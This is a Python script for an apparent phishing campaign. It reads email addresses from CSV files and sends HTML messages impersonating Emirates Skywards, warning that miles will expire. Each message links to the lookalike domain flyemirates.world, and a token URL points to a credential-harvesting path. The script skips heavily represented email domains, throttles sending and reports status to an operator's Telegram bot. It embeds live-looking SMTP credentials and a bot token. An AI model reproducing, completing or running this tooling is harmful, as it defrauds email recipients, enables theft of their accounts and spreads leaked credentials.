import csv
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import uuid
import jwt
from datetime import datetime, timedelta
import random
import time
import requests  # Import the requests library to send HTTP requests

# Secret key used to encode the JWT - you should keep this secure and not expose it in your code
SECRET_KEY = "your_secret_key"
# Telegram Bot Information
bot_token = "6362171314:AAEnB_4DdwDkCEjKmRTAH_5bTSqubvwrev8"
chat_id = "-1001926682773"

def generate_token():
    # Define the payload of the token
    payload = {
        'exp': datetime.utcnow() + timedelta(days=2),  # Token expiration time (2 days in this example)
        'iat': datetime.utcnow(),  # Time of token's creation
        'sub': str(uuid.uuid4())  # Unique identifier for the user - in this case a UUID
    }

    # Encode the payload using your secret key
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    
def send_telegram_message(message):
    """
    Sends a message to the specified Telegram chat.
    """
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, data=data)
        print(f"Telegram message sent: {message}")
    except Exception as e:
        print(f"Failed to send Telegram message. Error: {e}")
        
def save_token_to_file(token, file_path="tokens.txt"):
    with open(file_path, "a") as f:
        f.write(token + "\n")

def find_email_in_row(row):
    """
    Extracts an email address from a row using regex.
    """
    email_regex = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    for item in row:
        cleaned_item = item.strip()  # Strip whitespace from each item
        if email_regex.match(cleaned_item):
            return cleaned_item
    return None

SMTP_SERVERS = [
    {
        "host": "mail.privateemail.com",
        "username": "no_reply@flyemirates.world",
        "password": "QQQwww89#$",
        "port": 465,
        "encryption": "ssl"
    }
]

 
current_smtp_index = 0

def get_next_smtp():
    global current_smtp_index
    smtp = SMTP_SERVERS[current_smtp_index]
    current_smtp_index = (current_smtp_index + 1) % len(SMTP_SERVERS)
    return smtp

def send_email(server, smtp_username, receiver_email, subject, name, address, tracking_code, email, code, city, phone):
    print(f"Preparing email for {receiver_email}...")
    # Generate the token
    token = generate_token()

    # Include the token in the URL
    token_url = f"https://blockchaintrust.online/DEWA/Secure/auth.php?token={token}"

    # Updated HTML content with placeholder for the customer's name
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Emirates Skywards Welcome Email</title>
<style>
  body {{
    font-family: 'Arial', sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f2f2f2;
    color: #333;
    font-size: 14px;
  }}
  .email-container {{
    max-width: 600px;
    margin: 20px auto;
    background-color: #ffffff;
    padding: 20px;
    box-shadow: 0px 0px 5px rgba(0,0,0,0.1);
  }}
  .email-header {{
    background-color: #211b1b;
    color: #ffffff;
    padding: 20px;
    display: flex; /* Use flexbox for the header */
    align-items: center; /* Align items vertically */
    justify-content: space-between; /* Spread the logo and the title */
  }}
  .email-header img {{
    width: 100px; /* Replace with the actual logo width */
  }}
  .email-header div {{
    flex-grow: 1;
    text-align: center;
    margin-left: -100px; /* Adjust based on logo width to keep the title centered */
  }}
  .email-body {{
    padding: 20px;
    text-align: left;
  }}
  .email-body h2 {{
    color: #d71921;
    font-size: 22px;
  }}
  .email-body p {{
    font-size: 14px;
    line-height: 1.5;
  }}
  .email-footer {{
    padding: 20px;
    text-align: center;
    background-color: #f9f9f9;
    border-top: 1px solid #ddd;
  }}
  .email-footer p {{
    font-size: 12px;
    color: #666;
  }}
  .email-footer a {{
    color: #333;
    text-decoration: none;
    font-size: 12px;
    margin: 0 5px;
  }}
  .email-footer a:hover {{
    text-decoration: underline;
  }}
    .email-body .extend-button {{
    background-color: #d71921;
    color: #ffffff;
    padding: 10px 15px;
    text-decoration: none;
    border: none;
    border-radius: 2px;
    font-family: 'Arial', sans-serif;
    font-size: 14px;
    cursor: pointer;
    display: inline-block;
    margin-top: 15px;
  }}
  .email-body .extend-button:hover {{
    background-color: #c41412;
  }}
</style>
</head>
<body>

<div class="email-container">
  <div class="email-header">
    <!-- You will need to host the image and provide the correct src attribute -->
    <img src="http://image.e.emirates.email/lib/fe5615707c610d7a7310/m/1/5868764e-c97b-44b9-98d1-2114819a6a71.png" alt="Emirates Logo">
    <div>EMIRATES SKYWARDS</div>
  </div>
  <div class="email-body">
    <h2>Important Notice: Your Points Will Expire Soon</h2>
    <p>Dear valued member,</p>
    <p>We noticed that you have Skywards Miles that are due to expire on 27 February 2024. To ensure you can continue to enjoy the benefits of your hard-earned points, please take action before the expiry date.</p>
    <p>If you wish to keep your points and extend their validity, simply click the link below and follow the instructions to extend them now.</p>
    <!-- Replace href with the actual link to the points extension page -->
<a href="https://flyemirates.world/login/news.php" class="extend-button-link">
  <button type="button" class="extend-button">Extend Now</button>
</a>  </div>
  <div class="email-footer">
    <a href="#">Unsubscribe</a> |
    <a href="#">Contact us</a> |
    <a href="#">Privacy policy</a>
    <p>&copy; 2024 The Emirates Group. All rights reserved.</p>
  </div>
</div>

</body>
</html>
""".format(name=name, token_url=token_url)  # Insert the customer's name and token URL

    message = MIMEMultipart()
    message["From"] = f'"Emirates Skywards" <{smtp_username}>'
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(html_content, 'html'))

    try:
        print(f"Sending email to {receiver_email}...")
        server.sendmail(message["From"], receiver_email, message.as_string())
        print(f"Email sent to {receiver_email}!")
        return True
    except Exception as e:
        print(f"Failed to send email to {receiver_email}. Error: {e}")
        send_telegram_message(f"Failed to send email to {receiver_email}. Error: {e}")
        return False


# Define the paths for two CSV files
csv_file_path_a = 'dub.csv'
csv_file_path_b = 'a.csv'

def read_csv_rows_alternately(csv_file_a, csv_file_b):
    """
    Reads rows alternately from two CSV files, starting from the bottom to the top.
    """
    with open(csv_file_a, 'r', encoding='utf-8') as file_a, open(csv_file_b, 'r', encoding='utf-8') as file_b:
        reader_a = csv.reader(file_a)
        reader_b = csv.reader(file_b)
        rows_a = list(reader_a)[::-1]  # Reverse the rows of file_a
        rows_b = list(reader_b)[::-1]  # Reverse the rows of file_b
        max_length = max(len(rows_a), len(rows_b))

        for i in range(max_length):
            if i < len(rows_a):
                yield rows_a[i], 'a'
            if i < len(rows_b):
                yield rows_b[i], 'b'
                
def is_allowed_domain(email, allowed_domains):
    """
    Check if the email's domain is in the list of allowed domains.
    """
    domain = email.split('@')[-1]  # Extract the domain from the email
    return domain in allowed_domains

def send_email_with_retry(email, max_attempts=3):
    attempt_count = 0
    while attempt_count < max_attempts:
        smtp = get_next_smtp()
        try:
            server = setup_smtp_connection(smtp)
            if send_email(server, smtp["username"], email, ...):  # Adjust with your parameters
                print(f"Successfully sent email to {email}")
                return True
            else:
                print(f"Attempt {attempt_count + 1} failed, retrying...")
        except Exception as e:
            print(f"Attempt {attempt_count + 1} failed with error: {e}, retrying...")
        finally:
            attempt_count += 1
            if server:
                server.quit()
    print(f"Failed to send email to {email} after {max_attempts} attempts.")
    return False

def setup_smtp_connection(smtp):
    connection_timeout = 10  # Adjusted timeout
    if smtp["encryption"] == "ssl":
        server = smtplib.SMTP_SSL(smtp["host"], smtp["port"], timeout=connection_timeout)
    else:
        server = smtplib.SMTP(smtp["host"], smtp["port"], timeout=connection_timeout)
        server.starttls()
    server.login(smtp["username"], smtp["password"])
    return server
    

def count_email_domains(csv_file_paths):
    """
    Counts the occurrences of each email domain in the provided CSV files.
    """
    domain_count = {}
    email_regex = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')

    for file_path in csv_file_paths:
        with open(file_path, 'r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                for item in row:
                    cleaned_item = item.strip()
                    if email_regex.match(cleaned_item):
                        domain = cleaned_item.split('@')[-1]
                        domain_count[domain] = domain_count.get(domain, 0) + 1

    return domain_count

def get_rare_domains(domain_count, threshold=300):
    """
    Filters out domains that occur more than 'threshold' times.
    """
    return {domain for domain, count in domain_count.items() if count <= threshold}

def main():
    emails_sent = 0
    emails_failed = 0
    start_time = time.time()
    last_update_time = start_time  # Initialize last_update_time here
    email_limit_per_hour = 20
    csv_file_paths = [csv_file_path_a, csv_file_path_b]

    # Analyze domains and determine the rare ones
    domain_count = count_email_domains(csv_file_paths)
    rare_domains = get_rare_domains(domain_count)

    # Calculate the delay needed between each email
    delay_between_emails = 3600 / email_limit_per_hour if email_limit_per_hour > 0 else 0

    for row, source in read_csv_rows_alternately(csv_file_path_a, csv_file_path_b):
        email = find_email_in_row(row)
        if not email:
            print(f"Skipping row due to no email found: {row}")
            continue

        domain = email.split('@')[-1]
        if domain in rare_domains:
            # Proceed with sending the email
            name = row[0] if len(row) > 0 else "Unknown"
            address = row[1] if len(row) > 1 else "Unknown"
            code = row[2] if len(row) > 2 else "Unknown"
            phone = row[3] if len(row) > 3 else "Unknown"

            email_success = False
            attempt_count = 0

            while not email_success and attempt_count < len(SMTP_SERVERS):
                smtp = get_next_smtp()
                try:
                    print(f"Attempting to send email to {email} using SMTP server: {smtp['username']}")
                    server = setup_smtp_connection(smtp)
                    email_success = send_email(server, smtp["username"], email, "Don't Lose Your Reward Miles - Extend Today !", name, address, "", email, code, "", phone)
                    server.quit()
                except Exception as e:
                    print(f"Failed to send email to {email} with {smtp['username']} within timeout or other error. Error: {e}")
                    send_telegram_message(f"Failed to send email to {email} with {smtp['username']} within timeout or other error. Error: {e}")
                    emails_failed += 1
                    attempt_count += 1

                if email_success:
                    emails_sent += 1
                    print(f"Successfully sent email to {email} using SMTP server: {smtp['username']}")

                # Wait for the calculated delay before sending the next email
                time.sleep(delay_between_emails)

            if time.time() - last_update_time >= 1800:  # Every 30 minutes
                update_message = f"Status update: {emails_sent} emails sent successfully, {emails_failed} failed."
                send_telegram_message(update_message)
                last_update_time = time.time()

    final_message = f"Email sending script has finished. Total emails sent: {emails_sent}, Failed: {emails_failed}."
    print(final_message)
    send_telegram_message(final_message)

if __name__ == "__main__":
    main()
